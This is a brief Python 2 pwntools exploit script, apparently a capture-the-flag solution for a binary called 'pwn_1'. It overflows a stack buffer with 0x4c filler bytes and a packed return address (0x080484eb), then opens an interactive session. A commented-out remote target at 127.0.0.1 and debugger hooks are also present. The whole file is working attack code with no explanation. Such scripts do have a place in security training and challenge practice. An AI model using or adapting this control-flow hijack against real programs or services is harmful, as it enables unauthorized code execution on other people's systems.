#! /usr/bin/env python2
#coding:utf-8

from pwn import *

context.log_level = 'debug'

def pwn():
    p = process('pwn_1')
    # p = remote('127.0.0.1',1234)
    # gdb.attach(p)
    # pause()
    payload = 'A'*0x4c
    payload += p32(0x080484eb)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    pwn()